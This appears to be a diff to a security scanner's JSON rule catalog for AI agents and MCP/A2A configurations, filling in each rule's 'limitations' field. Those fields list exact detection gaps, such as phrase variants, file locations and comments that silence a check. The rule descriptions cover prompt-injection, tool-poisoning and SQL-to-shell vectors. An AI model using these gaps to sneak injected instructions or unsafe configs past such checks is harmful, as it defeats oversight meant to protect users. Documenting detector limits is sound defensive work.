@@ -12,7 +12,7 @@
       "cve_references": [],
       "description": "An A2A Agent Card exposes internal capabilities or admin-level skills that should not be advertised externally.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Reads the `capabilities` entries only (a list of strings, or the keys of an object) and matches `admin`, `system`, `internal`, `debug` or `root` as a whole word: `admin-console` is reported, but `admin_console`, `adminConsole` and `debugShell` are not, and a skill such as `admin-reset` under `skills` is not looked at. Cards are found at `agent-card.json` and `.well-known/agent.json` in the project root and in any file named `*agent-card*.json`; a card at `public/.well-known/agent.json` is not found.",
       "owasp_agentic_references": [
         "ASI07"
       ],
@@ -38,7 +38,7 @@
       "cve_references": [],
       "description": "An A2A Agent Card does not require authentication for interactions.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Reads the `authentication` (or `auth`) key and reports it when it is absent, `null`, the string `none`, or an object whose `type` is `none`. An empty `authentication: {}` or an object that lists no real scheme (`{\"schemes\": [\"none\"]}`) counts as declared. Only `agent-card.json` and `.well-known/agent.json` in the project root and files named `*agent-card*.json` are read; a card at `public/.well-known/agent.json` is not.",
       "owasp_agentic_references": [
         "ASI07"
       ],
@@ -64,7 +64,7 @@
       "cve_references": [],
       "description": "A2A skill definitions lack input schemas, allowing unvalidated data to be passed between agents. Unvalidated cross-agent payloads are the canonical ASI08 Agent Communication Poisoning primitive.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Reports a skill whose `inputSchema` is absent or an empty object. Any non-empty schema passes, including one that accepts everything (`{\"type\": \"object\"}` or `{\"type\": \"object\", \"additionalProperties\": true}`).",
       "owasp_agentic_references": [
         "ASI07",
         "ASI08"
@@ -91,7 +91,7 @@
       "cve_references": [],
       "description": "An A2A agent endpoint uses HTTP instead of HTTPS.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Reads `url`, `endpoint`, `baseUrl` and `base_url` on the card and `url` and `endpoint` on each skill, and matches a value that starts with `http://`. A plain-HTTP address under `additionalInterfaces`, an OAuth `tokenUrl`, or a `ws://` endpoint is not read or not matched.",
       "owasp_agentic_references": [
         "ASI07"
       ],
@@ -117,7 +117,7 @@
       "cve_references": [],
       "description": "An A2A Agent Card configures a JWT token lifetime greater than 1 hour (3600 seconds). Long-lived tokens increase the window for token theft and replay attacks.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Reads `tokenLifetime`, `token_lifetime`, `expiresIn` and `expires_in` anywhere in the card, as a number of seconds or an `Nh` string. A lifetime written in days or minutes (`\"7d\"`, `\"120m\"`), as an ISO 8601 duration (`PT24H`), or under another key (`ttl`, `accessTokenLifetimeSeconds`) is not read.",
       "owasp_agentic_references": [
         "ASI03"
       ],
@@ -143,7 +143,7 @@
       "cve_references": [],
       "description": "An A2A Agent Card disables JWT signature verification or allows the 'none' algorithm, permitting token forgery.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Reads `verifySignature` or `verify_signature` set to false, and an `algorithms` list that contains `none`. `algorithm: none` (singular), `skipSignatureVerification: true`, `verify: false`, and switched-off expiry or audience checks (`verify_exp: false`, `verify_aud: false`) are not read.",
       "owasp_agentic_references": [
         "ASI03"
       ],
@@ -169,7 +169,7 @@
       "cve_references": [],
       "description": "An A2A Agent Card lacks an 'id' or 'identity' field, or uses an HTTP endpoint, making it susceptible to agent impersonation attacks.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Checks only that an `id` or `identity` key exists, not what it holds: `\"id\": \"\"` and `\"identity\": null` both satisfy it, and nothing looks for a signature or any other proof of the identity. The other condition, an `http://` address in a top-level `url`, `endpoint`, `baseUrl` or `base_url`, does not look under `additionalInterfaces`.",
       "owasp_agentic_references": [
         "ASI10"
       ],
@@ -195,7 +195,7 @@
       "cve_references": [],
       "description": "Two agents establish an A2A connection where only the caller authenticates. The callee is trusted by URL alone \u2014 easy to spoof.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Reads `authentication.scheme`, a single string, and reports it when it contains `bearer` or `oauth` and the block declares no `mutual` flag or `mtls` scheme. A card that lists its schemes (`\"schemes\": [\"Bearer\"]`) or uses another scheme (`apikey`, `basic`) is not reported.",
       "owasp_agentic_references": [
         "ASI07"
       ],
@@ -221,7 +221,7 @@
       "cve_references": [],
       "description": "An A2A agent forwards incoming delegation tokens without reducing scope, allowing an N-deep chain to accumulate the caller's full rights.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Reports a `delegation` block that sets neither `max_depth` nor `max_hops`. Any value satisfies it (`\"max_depth\": 1000` is accepted), and whether the scope shrinks at each hop is not examined.",
       "owasp_agentic_references": [
         "ASI07"
       ],
@@ -247,7 +247,7 @@
       "cve_references": [],
       "description": "An A2A agent trusts claims relayed by a peer without verifying the original issuer. 'Agent B says A says X' must not be treated as X.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Reads one key, `trust.accepts_relayed_claims`, and only when it is the JSON boolean `true`. The string `\"true\"`, the spelling `acceptsRelayedClaims`, and any other key that accepts relayed claims (`relay_trust`) are not read.",
       "owasp_agentic_references": [
         "ASI07"
       ],
@@ -273,7 +273,7 @@
       "cve_references": [],
       "description": "An A2A flow accepts tokens without nonce, timestamp, or jti checks, allowing captured messages to be replayed. Replayed agent messages are a core ASI08 Agent Communication Poisoning primitive.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Checks that the `tokens` block contains a `jti`, `nonce`, `require_jti` or `replay_window` key and does not look at its value, so `\"require_jti\": false` or `\"replay_window\": 0` satisfies it. A card with no `tokens` block, or an empty one, is not examined.",
       "owasp_agentic_references": [
         "ASI07",
         "ASI08"
@@ -300,7 +300,7 @@
       "cve_references": [],
       "description": "An A2A endpoint accepts messages without version discriminator, allowing a v1 payload to be interpreted by a v2 handler (or vice versa) with changed field semantics. Schema-confusion injection is an ASI08 Agent Communication Poisoning pattern.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Asks for a `schema_version`, `a2a_version` or `apiVersion` only from a card that has a `tokens`, `delegation` or `trust` block, and only checks that the key exists: a card with none of those blocks, or with `\"schema_version\": \"\"`, is not reported.",
       "owasp_agentic_references": [
         "ASI07",
         "ASI08"
@@ -323,7 +323,7 @@
       "cve_references": [],
       "description": "The project declares a tool, MCP server or docstring that both performs an inference and names a Colorado SB 26-189 covered domain (education, employment, residential real estate, financial or lending services, insurance, health care, or essential government services and public benefits), and the repository carries no developer documentation at all: no model card, no system card, and no page naming intended uses. Where the technology is one C.R.S. 6-1-1702 covers, subsection (1) requires that documentation to be available to each deployer from 2027-01-01. This is evidence toward that duty, not a determination that the duty applies.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "A covered-domain decision is declared only by the name and docstring of a Python function whose decorator name contains the word `tool`, or by the names and descriptions in an MCP config. An HTTP route (`@app.post(\"/score\")`) or a TypeScript `server.tool(...)` that scores loan applicants declares nothing, and no ADMT rule reports for it.",
       "owasp_agentic_references": [],
       "owasp_ast_references": [],
       "owasp_mcp_references": [],
@@ -341,7 +341,7 @@
       "cve_references": [],
       "description": "Developer documentation exists for a declared covered-domain decision surface but does not describe the categories of data, including personal data, used to train the system. C.R.S. 6-1-1702(1)(b) requires that description, to the extent known, where the technology is one the statute covers. Evidence toward the duty, not a determination that it applies.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Passes as soon as the documentation contains `training data`, `training set`, `training corpus`, `data used to train`, `categories of data` or `trained on`, and does not check that any category of data is named: `Training data: not disclosed` satisfies it. Nothing is reported unless a covered-domain decision is declared first (see AAK-ADMT-001).",
       "owasp_agentic_references": [],
       "owasp_ast_references": [],
       "owasp_mcp_references": [],
@@ -359,7 +359,7 @@
       "cve_references": [],
       "description": "Developer documentation exists for a declared covered-domain decision surface but names no known limitations. C.R.S. 6-1-1702(1)(c) requires known limitations including known risks and the circumstances in which the covered technology should not be used. Evidence toward the duty, not a determination that it applies.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Passes as soon as the documentation contains `limitation`, `limitations`, `known risk`, `should not be used`, `out-of-scope` or `failure mode`, wherever it occurs: a licence footer ending `permissions and limitations under the License` satisfies it. Nothing is reported unless a covered-domain decision is declared first (see AAK-ADMT-001).",
       "owasp_agentic_references": [],
       "owasp_ast_references": [],
       "owasp_mcp_references": [],
@@ -377,7 +377,7 @@
       "cve_references": [],
       "description": "Developer documentation exists for a declared covered-domain decision surface but gives no instruction for human review of the system's output. C.R.S. 6-1-1702(1)(d) requires instructions for the deployer's appropriate use, monitoring, and meaningful human review, where applicable, and is more specific here than in the other documentation paragraphs. Evidence toward the duty, not a determination that it applies.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Passes on `human review`, `human-in-the-loop`, `human oversight`, `manual review` or `reviewed by a human` anywhere in the documentation, including in a sentence that denies it: `No human review is performed` satisfies it. Nothing is reported unless a covered-domain decision is declared first (see AAK-ADMT-001).",
       "owasp_agentic_references": [],
       "owasp_ast_references": [],
       "owasp_mcp_references": [],
@@ -609,7 +609,7 @@
       "incident_references": [
         "ARXIV-2605.18747"
       ],
-      "limitations": "",
+      "limitations": "Tracks only module-level `dict`, `list` and `set` objects that methods of classes whose names end in `Agent`, `Worker` or `Harness` mutate. The same shared state held as a class attribute (`self.registry[key] = value`), or mutated by classes named `Researcher` and `Writer`, is not seen. A method that mentions a name such as `Lock` or `acquire` counts as locking, so `with threading.Lock():`, which makes a new lock on every call and excludes nothing, clears it.",
       "owasp_agentic_references": [
         "ASI04",
         "ASI06"
@@ -1116,7 +1116,7 @@
       ],
       "description": "On Windows, Claude Code prior to 2.1.75 loads `%ProgramData%\\ClaudeCode\\managed-settings.json` without validating directory ownership or ACLs. A low-privileged user can plant a malicious config that executes on every launch. CVE-2026-35603 (CVSS 5.4 MEDIUM, CWE-426 Untrusted Search Path).",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Needs a `managed-settings.json` whose own path contains `ProgramData`, so a file staged elsewhere and copied into `%ProgramData%\\ClaudeCode` by an installer is not seen. A sibling `setup.ps1` that mentions `icacls` clears the finding whatever the command grants, `icacls ... /grant Everyone:(OI)(CI)F` included.",
       "owasp_agentic_references": [
         "ASI06"
       ],
@@ -1257,7 +1257,7 @@
       "incident_references": [
         "CERT-CC-VU-221883"
       ],
-      "limitations": "",
+      "limitations": "Fires only when all four shapes (an unsafe-mode `CodeInterpreterTool`, a `JSONSearchTool` or `JSONLoader` path, a `RagTool` or `WebsiteSearchTool` URL, and a missing Docker check) are found in one file. The same shapes split across two modules are never reported as the chain, and a comment that mentions `assert_codeinterp_safe_mode(` removes one shape from the count.",
       "owasp_agentic_references": [
         "ASI01",
         "ASI05",
@@ -1288,7 +1288,7 @@
       "incident_references": [
         "CERT-CC-VU-221883"
       ],
-      "limitations": "",
+      "limitations": "Fires on a literal `unsafe_mode=True` in a `CodeInterpreterTool(...)` call in a file that imports crewai. `unsafe_mode` taken from a variable or a setting is not read, and the guard is looked for as text in the enclosing function, so a comment that mentions `assert_codeinterp_safe_mode(` silences it.",
       "owasp_agentic_references": [
         "ASI05"
       ],
@@ -1314,7 +1314,7 @@
       "incident_references": [
         "CERT-CC-VU-221883"
       ],
-      "limitations": "",
+      "limitations": "Needs a non-constant path argument and, in the same function, one of a short list of source spellings (`request.json`, `request.args`, `request.form`, `event`, `user_input`, `agent.kickoff(`, ...). `request.get_json()`, or a path that arrives as a function parameter, is not a source, so the call is not reported.",
       "owasp_agentic_references": [
         "ASI02"
       ],
@@ -1369,7 +1369,7 @@
       "incident_references": [
         "CERT-CC-VU-221883"
       ],
-      "limitations": "",
+      "limitations": "Fires on every `CodeInterpreterTool(...)` call that has no literal `docker_required=True` and no `require_docker_liveness(` in the enclosing function. That text is matched as source, so a comment that mentions `require_docker_liveness(` silences it.",
       "owasp_agentic_references": [
         "ASI09"
       ],
@@ -1391,7 +1391,7 @@
       "cve_references": [],
       "description": "A function that targets DeepSeek V4 (OpenAI-compatible client with `base_url=` containing 'deepseek', or `import deepseek`) reads from an untrusted source (request body, document loader, file read) and passes the value into a `tools=[{description: ...}]` payload without calling `sanitize_tool_description`. DeepSeek V4 (Apache 2.0, 2026-04-24) exposes MoE routing via its tool-call envelope \u2014 untrusted text inside a tool description can poison expert selection (LLM01 with MoE-specific surface). Speculative shape until corpus refresh.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Python only, per function. A DeepSeek target is recognised only from a string literal containing `deepseek` in `base_url=`, or a `deepseek` import: a URL held in a constant is not seen. An untrusted source is recognised only from a short list (`request.json`, `request.args`, `pdfplumber.open`, `unstructured.partition`, `open(...).read()`), so a page fetched with `requests.get(url).text` is not one, and any `re.sub(` call in the function counts as sanitising.",
       "owasp_agentic_references": [
         "ASI01"
       ],
@@ -1545,7 +1545,7 @@
       "cve_references": [],
       "description": "An agent config declares two or more locales (or `multilingual: true`) for a user-facing surface, but the repository's eval / test fixtures reference only a single language. Cross-lingual robustness is a required-evidence axis under EU AI Act Article 15 (binding for Annex III high-risk use cases on 2027-12-02 and for Annex I product-embedded high-risk systems on 2028-08-02), and Ford et al. 2026 (arXiv:2605.23157) document that single-language safety eval misses language-specific jailbreak / refusal-regression vectors that scale non-uniformly across languages.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Counts a locale as evaluated when its code appears in the path of any file under a directory named `evals`, `eval`, `fixtures`, `scenarios`, `i18n`, `locales`, `benchmarks` and the like, whatever the file holds. `locales/fr.json`, a file of UI translation strings, therefore counts as an eval for French.",
       "owasp_agentic_references": [],
       "owasp_ast_references": [],
       "owasp_mcp_references": [],
@@ -1690,7 +1690,7 @@
       "cve_references": [],
       "description": "A tool description, SKILL.md body, agent card, or system prompt represents the AI as a therapist / counselor / psychologist / 'qualified mental health professional'. Tennessee SB 1580 (signed 2026-04-01) makes this unlawful and enforceable via the TN Consumer Protection Act, with a **private right of action** and $5,000 civil penalty per violation.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Reads `.md`, `.json`, `.yaml`, `.yml` and `.txt` files and matches a short phrase list: `I am a/your therapist`, `act as a/your counselor`, `provide therapy`, `deliver psychotherapy`, `replace your therapist` and `licensed mental health professional`. The contraction `I'm your therapist`, `acting as your counselor` and the third-person `provides licensed therapy` or `delivers psychotherapy` are not matched, and neither is a persona written in a `.py` file.",
       "owasp_agentic_references": [
         "ASI05"
       ],
@@ -1712,7 +1712,7 @@
       "cve_references": [],
       "description": "Code or prompt describes an AI system making prior-authorization or medical-necessity decisions without licensed-physician review. Kansas, Washington, and Utah 2026 laws require a clinician in the loop for these decisions.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Reads `.md`, `.json`, `.yaml`, `.yml` and `.txt` files and matches an adverb or a `no human` phrase, a verb in its base form and a decision object, as in `automatically approve prior authorization`. The same decision in the third person or another form (`automatically approves prior authorization requests`, `auto-denies medical necessity appeals`, `with no physician review`) is not matched, and neither is a rule written in a `.py` file.",
       "owasp_agentic_references": [
         "ASI05"
       ],
@@ -1732,7 +1732,7 @@
       "cve_references": [],
       "description": "Code / prompt describes an AI system approving or denying insurance coverage without a human in the loop. Georgia and Iowa 2026 laws restrict AI-only coverage / benefit determinations.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Reads `.md`, `.json`, `.yaml`, `.yml` and `.txt` files and matches `AI`, `algorithm` or `model`, then `only`, `solely` or `alone`, a decision verb and a singular object, as in `AI solely determines coverage`. `AI solely denies claims` (a plural object), `AI-only coverage decisions` (a hyphen) and `the model alone decides whether a benefit applies` (a clause in between) are not matched.",
       "owasp_agentic_references": [
         "ASI05"
       ],
@@ -1752,7 +1752,7 @@
       "cve_references": [],
       "description": "Text mentions patient / clinical / mental-health / therapy / diagnosis but the tool never explicitly says the responder is an AI. Multiple 2026 state laws (TN, WA, UT) expect clear AI disclosure in clinical interactions.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Reads `.md`, `.json`, `.yaml`, `.yml` and `.txt` files. Healthcare context is one of nine whole words (`patient`, `clinical`, `medical`, `mental health`, `therapy`, `diagnosis`, `symptom`, `treatment`, `medication`), so plurals do not count: a persona about `symptoms` and `medications` is skipped, as is one about a nurse, a prescription or a dosage.",
       "owasp_agentic_references": [
         "ASI05"
       ],
@@ -1772,7 +1772,7 @@
       "cve_references": [],
       "description": "A healthcare AI surface mentions suicide / self-harm / crisis but never references 988 / 911 / 112 / 999 / a crisis line. Tennessee HB 1951 (2026) creates criminal liability for encouraging suicide; lacking an escalation path materially worsens the exposure.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Reads `.md`, `.json`, `.yaml`, `.yml` and `.txt` files and matches `suicid*`, `self-harm`, `overdose`, `harm myself`, `kill yourself`, `end my life` and similar; `want to die`, `self-injury` and `hurting themselves` are not matched. The escalation check passes on any `988`, `911`, `crisis line`, `emergency services` or `call 112` anywhere in the file, an unrelated number such as `ORD-911` included.",
       "owasp_agentic_references": [
         "ASI05"
       ],
@@ -2186,7 +2186,7 @@
       "cve_references": [],
       "description": "A `.vscode/tasks.json` or `.vscode/launch.json` file could not be parsed even after stripping JSONC comments and trailing commas. AAK reports this rather than skipping it silently: an unparseable config file is exactly where an auto-run task would hide from a scan.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Parses only `tasks.json` and `launch.json` directly inside a `.vscode` folder. A broken `.vscode/settings.json`, or a `.code-workspace` file, which can carry a `tasks` block of its own, is not parsed and never reported.",
       "owasp_agentic_references": [],
       "owasp_ast_references": [],
       "owasp_mcp_references": [],
@@ -2361,7 +2361,7 @@
       "incident_references": [
         "IPI-WILD-2026-04-24"
       ],
-      "limitations": "",
+      "limitations": "Reads `.md`, `.txt`, `.yml`, `.yaml`, `.json` and `.py` files, by their lower-case extension, and applies ten regular expressions to the text, where `.*` does not cross a line. The same payload in `.jsonl`, `.html` or `.j2` (RAG seed corpora and prompt templates), in a `.MD` file, or split over two lines, is not matched.",
       "owasp_agentic_references": [
         "ASI03"
       ],
@@ -2413,7 +2413,7 @@
       ],
       "description": "Source code calls langchain.load_prompt() or load_prompt_from_config() with a user-controlled path argument. Even on patched versions, the allow_dangerous_paths escape hatch is a sharp edge.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Pattern-matches the first `load_prompt(` or `load_prompt_from_config(` call in a file that mentions langchain, and only when the argument is a bare (dotted) name or an f-string with a `{}` placeholder. An argument that is a call (`os.path.join(PROMPTS, name)`), a concatenation (`\"prompts/\" + name`) or a keyword (`path=name`) is not matched.",
       "owasp_agentic_references": [
         "ASI06"
       ],
@@ -2467,7 +2467,7 @@
       "incident_references": [
         "LANGCHAIN-PROMPT-LOADER-2026-03"
       ],
-      "limitations": "",
+      "limitations": "Needs a non-constant path passed to `load_prompt` or `from_file` and, in the same function, a source spelled `request.json`, `request.args`, `sys.argv`, `os.environ` or the like; a path that arrives as a function parameter is not a source. Any `os.path.realpath(` in the function counts as a guard although it normalises the path and does not confine it to a directory. `from langchain_core.prompts.loading import load_prompt` is not one of the import forms that put a file in scope.",
       "owasp_agentic_references": [
         "ASI02"
       ],
@@ -2521,7 +2521,7 @@
       "cve_references": [],
       "description": "Source code calls `ToolNode([...])` (or `ToolNode(some_list)`) with a positional list rather than the documented `ToolNode(tools=[...])` keyword form. langgraph-prebuilt 1.0.11 (2026-04-24) regressed and silently coerces a positional list into a single-tool node, dropping every tool past the first and producing message-loop bugs in agents that depend on tool-routing behaviour.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Fires on `ToolNode(...)` with a list literal or a bare name as its first positional argument, in a file with a single-line `from langgraph.prebuilt import ... ToolNode`. A parenthesised multi-line import, `from langgraph.prebuilt.tool_node import ToolNode`, and an argument that is an attribute or a call (`ToolNode(self.tools)`) are not matched.",
       "owasp_agentic_references": [
         "ASI09"
       ],
@@ -2541,7 +2541,7 @@
       "cve_references": [],
       "description": "A dependency uses a copyleft license (AGPL, SSPL) that may impose obligations on your project.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Reads the `license` field of each `package.json` in the scanned tree and matches a value that starts with `AGPL`, `SSPL`, `GPL-3` or `EUPL`. `node_modules` is skipped, so the licence of an installed dependency is not checked, and the legacy `licenses` array is not read.",
       "owasp_agentic_references": [
         "ASI04"
       ],
@@ -2563,7 +2563,7 @@
       "cve_references": [],
       "description": "A dependency has no declared license, creating legal uncertainty about usage rights.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Reads the `license` key of each `package.json` in the scanned tree and skips `node_modules`, so an installed dependency with no license is not checked. Any value counts as declared, an empty string and `UNLICENSED` included.",
       "owasp_agentic_references": [
         "ASI04"
       ],
@@ -2585,7 +2585,7 @@
       "cve_references": [],
       "description": "A dependency has been flagged for DMCA/IP violations or contains leaked proprietary code.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Matches three package names (`claude-code-leaked`, `anthropic-internal` and `copilot-source`, with or without a scope) in the direct dependency maps of each `package.json`. An `npm:` alias (`\"cc-tools\": \"npm:claude-code-leaked@^1.0.0\"`), a lockfile entry, a Python requirement and any other name are not matched.",
       "owasp_agentic_references": [
         "ASI04"
       ],
@@ -2645,7 +2645,7 @@
       ],
       "description": "An agent / LLM application feeds model-generated SQL into a database executor whose connection role holds code-execution or filesystem privileges, turning prompt-injected SQL into remote code execution. Two arms fire this rule: (a) an LLM-output value reaches a SQL-execution sink (`cursor.execute` / `conn.execute` / SQLAlchemy `text(...)` / a TS `.query()`/`.raw()` call) as the query itself \u2014 not as a bound parameter \u2014 with no allow-list or query-validation step; and (b) a DB connection string / role that grants the dangerous primitives (a superuser connection account, or a literal PostgreSQL `COPY ... FROM PROGRAM` / `pg_execute_server_program`, MySQL `FILE` / `INTO OUTFILE` / `LOAD_FILE`, or MS SQL `xp_cmdshell`) inside an LLM/agent context. CVE-2026-25879 is the documented instance: a text-to-SQL chat agent ran model output on a superuser connection and a prompt-injected `COPY ... FROM PROGRAM` produced a shell. CWE-94 (Code Injection) / CWE-89 (SQL Injection) chained to CWE-78 (OS Command Injection) through CWE-250 (Execution with Unnecessary Privileges). This is distinct from `AAK-TAINT-005`, where the tainted source is a tool *parameter* string-formatted into SQL rather than LLM output landing on an RCE-capable role.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "The flow arm follows model output through plain assignments to a call named `execute`, `executemany`, `executescript` or `exec_driver_sql`; LangChain's `db.run(sql)` is not a sink. Any identifier, import or string in the file containing `sqlglot`, `sqlparse`, `allowlist` or `whitelist` switches that arm off, so `sqlparse.format(sql, reindent=True)`, which only pretty-prints, counts as validation. The privilege arm judges the database role from a literal connection URI or literal SQL text in the source: a DSN read from `os.environ` is not seen.",
       "owasp_agentic_references": [
         "ASI02",
         "ASI05"
@@ -2706,7 +2706,7 @@
       ],
       "description": "A `@tool`-decorated function parameter flows into logger.info / print / sys.stdout.write / console.log without stripping control characters (\\r, \\n, \\x1b) first. CVE-2026-6494 (AAP MCP, CVSS 5.3 MEDIUM, CWE-117) lets an attacker forge log entries and inject ANSI escape sequences to socially engineer an operator.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Reads the arguments of calls spelled `logger.<level>`, `log.<level>`, `console.<level>` and `sys.stdout.write` in functions whose decorator name ends in `tool`. `logging.info(...)`, `self.logger.info(...)` and `print(...)` are not matched, and a `.replace(\"\\n\", ...)` or a `sanitize` call anywhere in the function clears it, whichever value that touches.",
       "owasp_agentic_references": [
         "ASI05"
       ],
@@ -3543,7 +3543,7 @@
       "cve_references": [],
       "description": "An MCP Apps (SEP-1865) `text/html` UI resource is rendered in an `<iframe>` with no `sandbox` attribute, or with a self-defeating `sandbox=\"allow-scripts allow-same-origin\"` (which lets the framed document script the host origin). MCP Apps UI is server-controlled, untrusted content running next to the user's agent session; without a restrictive sandbox it executes in the host context (XSS / token theft / tool invocation).",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Reads `.ts`, `.tsx`, `.js`, `.jsx`, `.mjs`, `.cjs`, `.html`, `.htm`, `.vue` and `.svelte` files that carry an MCP Apps marker (`ui://`, `@mcp-ui/`, `createUIResource` and similar). An `<iframe>` tag is judged by the value of its `sandbox`, but an iframe created in script is judged only by whether a sandbox is set at all: `frame.setAttribute(\"sandbox\", \"allow-scripts allow-same-origin\")` is not reported.",
       "owasp_agentic_references": [
         "ASI05"
       ],
@@ -3570,7 +3570,7 @@
       "cve_references": [],
       "description": "An MCP Apps (SEP-1865) UI writes content to the DOM through a raw-HTML sink (`innerHTML` / `outerHTML` / `insertAdjacentHTML` / React `dangerouslySetInnerHTML` / Vue `v-html` / Svelte `{@html}`) with no sanitizer (DOMPurify / `sanitize*` / escaping) in the file. Server- or tool-provided content reaching an unsanitized HTML sink is DOM XSS \u2014 the injected script runs in the app frame with access to its postMessage tool bridge.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Looks for `innerHTML =`, `outerHTML =`, `insertAdjacentHTML(`, `dangerouslySetInnerHTML`, `v-html` and `{@html`; jQuery's `.html(content)`, `document.write` and `iframe.srcdoc =` are not sinks here. Any mention of `sanitize`, `DOMPurify`, `escapeHtml`, `xss` or `purify` clears the whole file, an import that is never called included.",
       "owasp_agentic_references": [
         "ASI05"
       ],
@@ -4047,7 +4047,7 @@
       "cve_references": [],
       "description": "A tool entry in a SEP-1649 server card (`/.well-known/mcp/server-card.json`) carries a `description` containing a tool-poisoning / imperative-injection payload \u2014 invisible Unicode, a prompt-injection directive, a cross-tool reference, or an encoded (base64/hex) blob. Because a client fetches and trusts the card *before* connecting, the injected instructions enter the model context ahead of any tool call. Detection reuses the AAK-POISON-001..006 detectors.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Reads `tools[].description` in a committed card with the phrase lists of AAK-POISON-001..004, so the same wording gaps apply. Text in a tool's `title`, or in the parameter descriptions of its `inputSchema`, is not read.",
       "owasp_agentic_references": [
         "ASI06"
       ],
@@ -4071,7 +4071,7 @@
       "cve_references": [],
       "description": "A SEP-1649 server card's declared `transport` disagrees with its advertised capabilities: a remote transport (`http`/`sse`/`streamable-http`/`ws`, or a routable `endpoint` URL) while `authentication.required` is `false` (an anyone-can-connect network endpoint), or a `stdio`/local transport that nonetheless advertises a remote `endpoint`. A client that provisions based on the card's advertised shape connects to a transport it did not expect.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Reports a remote transport only when `authentication.required` is the JSON boolean `false`. A remote transport with no `authentication` block at all, or with `\"required\": \"false\"` as a string, is not reported, and the endpoint is read from the `transport` object only: a top-level `url` is ignored.",
       "owasp_agentic_references": [
         "ASI03"
       ],
@@ -4095,7 +4095,7 @@
       "cve_references": [],
       "description": "A SEP-1649 server card carries no `signature` / `provenance` / `attestation` / `publisher` field, or one that is empty / a placeholder. The card's self-declared tool list, transport, and endpoint are then trusted with no proof of origin \u2014 a MITM or a typosquatting host can serve a forged card at the well-known path and the client will provision against it.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Checks that a `signature`, `signatures`, `provenance`, `attestation`, `publisher` or `verified` field exists and is not empty or a placeholder (`todo`, `unsigned`, `xxx` and the like). It never verifies a signature, so `\"signature\": \"not-a-real-signature\"` or `\"verified\": true` satisfies it.",
       "owasp_agentic_references": [
         "ASI06"
       ],
@@ -4119,7 +4119,7 @@
       "cve_references": [],
       "description": "A SEP-1649 server card asserts over-broad capabilities: a wildcard auth scope (`*` / `all`), a `capabilities` object with everything enabled and no constraint, or `authentication.required: true` paired with an empty `schemes` list (no enforceable method). Over-broad claims invite clients to grant more trust / scope than the server needs, widening blast radius on compromise.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Treats a scope as a wildcard only when it is exactly `*`, `all`, `any`, `full`, `admin`, `root` or `*:*`, so `mcp:*` or `tools:*` passes. A capability counts as asserted only when its value is the boolean `true`: a card that lists `tools`, `resources`, `prompts` and `logging` as objects is not reported.",
       "owasp_agentic_references": [
         "ASI04"
       ],
@@ -4704,7 +4704,7 @@
       "incident_references": [
         "ARXIV-2604.20994"
       ],
-      "limitations": "",
+      "limitations": "Reads descriptions written as string literals at the registration site: `description=\"...\"` on a Python `@mcp.tool(...)`, `@server.tool(...)` or `@app.tool(...)`, the second string argument of a TypeScript `server.tool(\"name\", \"description\", ...)`, a Java `@Tool` or a Rust `#[mcp_tool]`. A TypeScript `registerTool(name, { description })` call, a template-literal description and a description kept in a constant are not read, and `ignore all previous instructions` is not matched.",
       "owasp_agentic_references": [
         "ASI04"
       ],
@@ -5362,7 +5362,7 @@
       ],
       "description": "The Kong Konnect MCP server before 1.0.0 is vulnerable to indirect prompt injection: untrusted content returned to the server (e.g. an API response, spec, or resource body it relays to the agent) can carry attacker-authored instructions that the agent then acts on, causing it to issue unintended Kong Admin/Konnect API requests it was never asked to make \u2014 a confidentiality-impacting cross-boundary injection, not a generic prompt-injection heuristic (CVE-2026-13341, CVSS 7.4 HIGH, published 2026-07-03). A config that dispatches the Konnect MCP server at a version below 1.0.0 (or unpinned) is exposed.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Reads the `konnect-mcp` spelling (with an optional `kong-` or `@kong/` before it and `-server` after it) in manifests, `.mcp.json`, `mcp.json` and `claude_desktop_config.json` at the project root. The `mcp-konnect` order, as in `npx @kong/mcp-konnect@0.1.0`, is not matched, and a server configured in `.cursor/mcp.json` or `.vscode/mcp.json` is not read.",
       "owasp_agentic_references": [
         "ASI01"
       ],
@@ -6392,7 +6392,7 @@
       "incident_references": [
         "ARXIV-2605.14312"
       ],
-      "limitations": "",
+      "limitations": "Counts the entries of an operation's own `parameters` list and the `properties` of an inline request-body schema. A request body whose schema is a `$ref` into `components`, and parameters declared once at the path level, are not counted, and the spec must be at the project root or under a top-level `api/`, `openapi/`, `spec/` or `docs/api/` folder (`backend/openapi.yaml` is not found).",
       "owasp_agentic_references": [],
       "owasp_ast_references": [],
       "owasp_mcp_references": [],
@@ -6414,7 +6414,7 @@
